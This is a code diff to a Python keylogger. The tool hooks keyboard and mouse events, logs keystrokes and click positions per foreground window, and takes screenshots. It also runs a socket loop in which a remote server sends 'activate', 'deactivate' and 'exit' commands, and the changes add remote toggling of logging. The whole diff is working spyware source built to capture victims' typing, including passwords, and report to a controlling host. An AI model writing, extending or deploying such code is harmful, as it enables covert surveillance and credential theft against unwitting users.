@@ -43,24 +43,27 @@ class Keylogger:
 
 #--------------- CALLBACK FUNCTIONS ---------------#
     def keyboard_callback(self, event):
-        name = event.name
-        if len(name) > 1:
-            if name == "space":
-                name = " "
-            elif name == "enter":
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        self.log += name
+        if self.active:
+            name = event.name
+            if len(name) > 1:
+                if name == "space":
+                    name = " "
+                elif name == "enter":
+                    name = "[ENTER]\n"
+                elif name == "decimal":
+                    name = "."
+                else:
+                    name = name.replace(" ", "_")
+                    name = f"[{name.upper()}]"
+            self.log += name
 
     def mouse_left_callback(self):
-        self.log += f"[L_CLICK, {mouse.get_position()}]"
+        if self.active:
+            self.log += f"[L_CLICK, {mouse.get_position()}]"
 
     def mouse_right_callback(self):
-        self.log += f"[R_CLICK, {mouse.get_position()}]"
+        if self.active:
+            self.log += f"[R_CLICK, {mouse.get_position()}]"
 
 #--------------- WRITE FUNCTIONS ---------------#
     def write_information_file(self):
@@ -168,27 +171,33 @@ class Keylogger:
 
 #--------------- POLLING FUNCTIONS ---------------#
     def check_foreground_window(self):
-        while self.active:
-            current_window = GetWindowText(GetForegroundWindow())
-            timenow = datetime.now()
+        while True:
+            if self.active:
+                current_window = GetWindowText(GetForegroundWindow())
+                timenow = datetime.now()
 
-            if current_window != self.foreground_window:
-                self.write_keylogs_to_file(self.foreground_window)
-                self.screenshot()
-                self.foreground_window = current_window
-                self.filecounter = 0
+                if current_window != self.foreground_window:
+                    self.write_keylogs_to_file(self.foreground_window)
+                    self.screenshot()
+                    self.foreground_window = current_window
+                    self.filecounter = 0
 
-            elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
-                self.end_time = timenow
-                self.write_keylogs_to_file(current_window)
-                self.screenshot()
-                self.filecounter += 1
+                elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
+                    self.end_time = timenow
+                    self.write_keylogs_to_file(current_window)
+                    self.screenshot()
+                    self.filecounter += 1
 
             time.sleep(self.window_interval)
 
 #--------------- START / STOP ---------------#
-    def start(self):
+    def activate(self):
         self.active = True
+    
+    def deactivate(self):
+        self.active = False
+
+    def start(self):
         self.write_information_file()
 
         keyboard.on_press(callback=self.keyboard_callback)
@@ -200,12 +209,13 @@ class Keylogger:
         t.start()
 
     def stop(self):
-        self.active = False
+        self.deactivate()
         self.sock.close()
 
 #--------------- MAIN ---------------#
 if __name__ == "__main__":
     keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
+    keylogger.start()
     keylogger.connect_to_host()
 
     while True:
@@ -220,8 +230,11 @@ if __name__ == "__main__":
                     keylogger.send_to_server(data)
             else:
                 if recv == "activate":
-                    keylogger.start()
+                    keylogger.activate()
                     keylogger.send_to_server("logging activated")
+                elif recv == "deactivate":
+                    keylogger.deactivate()
+                    keylogger.send_to_server("logging deactivated")
                 elif recv == "exit":
                     keylogger.send_to_server("terminated")
                     keylogger.stop()
